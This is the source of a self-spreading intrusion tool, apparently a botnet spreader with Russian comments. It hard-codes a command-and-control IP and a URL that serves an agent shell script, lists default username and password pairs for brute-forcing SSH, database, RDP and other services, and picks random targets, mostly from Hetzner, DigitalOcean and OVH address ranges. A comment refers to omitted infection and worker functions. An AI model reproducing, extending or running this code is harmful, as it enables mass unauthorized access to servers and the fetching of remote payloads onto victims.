#!/usr/bin/env python3
# AVZ-Aristo Spreader v26.9 – облачные диапазоны, masscan на серверные порты
import asyncio, aiohttp, random, socket, time, json, os, sys, argparse, ftplib, subprocess, ipaddress, logging, sqlite3, requests, traceback, shutil
from datetime import datetime, timezone, timedelta

if sys.platform != 'win32':
    import resource
    try:
        resource.setrlimit(resource.RLIMIT_NOFILE, (65535, 65535))
    except:
        pass

logging.getLogger("paramiko").setLevel(logging.WARNING)

C2_HOST = "80.249.146.202"
C2_PORT = 80
API_PORT = 8080
AGENT_URL = f"http://{C2_HOST}:{API_PORT}/agent_bash.sh"
MAX_CONCURRENT = 1500
QUICK_TIMEOUT = 3.0
BRUTE_TIMEOUT = 8.0
DEFAULT_SCAN_COUNT = 25_000
PORT_LIST = [21, 22, 23, 80, 443, 1433, 27017, 3306, 3389, 445, 5432, 5900, 5984, 5985, 6379, 8080, 9042, 9200]

CREDS = [
    ("root","root"), ("root","admin"), ("root","password"), ("root","123456"), ("root","1234"), ("root","pass"), ("root","toor"), ("root","changeme"),
    ("admin","admin"), ("admin","password"), ("admin","123456"), ("admin","1234"), ("admin","changeme"), ("admin",""),
    ("user","user"), ("user","password"), ("user","123456"),
    ("test","test"), ("guest","guest"), ("support","support"),
    ("sa",""), ("sa","sa"), ("sa","password"), ("sa","123456"),
    ("postgres","postgres"), ("postgres","password"), ("postgres","123456"),
    ("pi","raspberry"), ("pi","raspberrypi"), ("pi","password"),
    ("ubnt","ubnt"), ("admin","password1"),
    ("mysql","mysql"), ("oracle","oracle"),
    ("tomcat","tomcat"), ("jenkins","jenkins"),
    ("Administrator",""), ("Administrator","admin"), ("Administrator","password"), ("Administrator","123456"),
    ("cisco","cisco"), ("www-data","www-data"), ("alpine","alpine"),
    ("hadoop","hadoop"), ("elasticsearch","elasticsearch"),
    ("ftp","ftp"), ("anonymous","anonymous")
]

SUCCESS_CREDS_FILE = "success_creds.json"
SUCCESS_CREDS = []
if os.path.exists(SUCCESS_CREDS_FILE):
    with open(SUCCESS_CREDS_FILE) as f:
        SUCCESS_CREDS = json.load(f)

DB_FILE = "ports_cache.db"
conn = sqlite3.connect(DB_FILE)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS ports (ip text, port integer, seen integer, PRIMARY KEY (ip, port))''')
conn.commit()
PORT_CACHE_TTL = 3600

def is_port_cached(ip, port):
    c.execute("SELECT seen FROM ports WHERE ip=? AND port=? AND seen > ?", (ip, port, time.time() - PORT_CACHE_TTL))
    return c.fetchone() is not None

def cache_port(ip, port):
    c.execute("INSERT OR REPLACE INTO ports VALUES (?, ?, ?)", (ip, port, int(time.time())))
    conn.commit()

# Диапазоны популярных облачных провайдеров (первые 5 для примера)
CLOUD_RANGES = [
    "5.9.0.0/16",       # Hetzner
    "138.201.0.0/16",   # Hetzner
    "167.172.0.0/16",   # DigitalOcean
    "164.90.0.0/16",    # DigitalOcean
    "51.75.0.0/16",     # OVH
    "188.166.0.0/16",   # DigitalOcean
    "116.203.0.0/16",   # Hetzner
    "78.46.0.0/15",     # Hetzner
]
random.shuffle(CLOUD_RANGES)

GUARANTEED_IPS = [
    "45.33.32.156", "34.94.3.0", "45.77.165.0", "185.220.101.0", "23.226.229.0",
    "103.15.28.0", "185.225.19.0", "45.33.32.0", "45.56.89.0", "45.79.207.0"
]
random.shuffle(GUARANTEED_IPS)

TARGET_COUNTRY = os.environ.get("SPREAD_COUNTRY", "").upper()

def random_ip():
    # 60% облачные провайдеры, 25% гарантированные, 15% случайные
    if random.random() < 0.6:
        r = random.choice(CLOUD_RANGES)
        net = ipaddress.IPv4Network(r)
        return str(net[random.randint(0, min(255, net.num_addresses-1))])
    if random.random() < 0.625:
        return random.choice(GUARANTEED_IPS)
    while True:
        a = random.randint(1, 223)
        b = random.randint(0, 255)
        c = random.randint(0, 255)
        d = random.randint(0, 255)
        if a == 10 or a == 127: continue
        if a == 172 and 16 <= b <= 31: continue
        if a == 192 and b == 168: continue
        if a >= 224: continue
        return f"{a}.{b}.{c}.{d}"

# ... (весь остальной код спредера: ssh_brute, infect, worker, scan_cycle, main_async) без изменений, только добавлены облачные диапазоны и обновлён random_ip
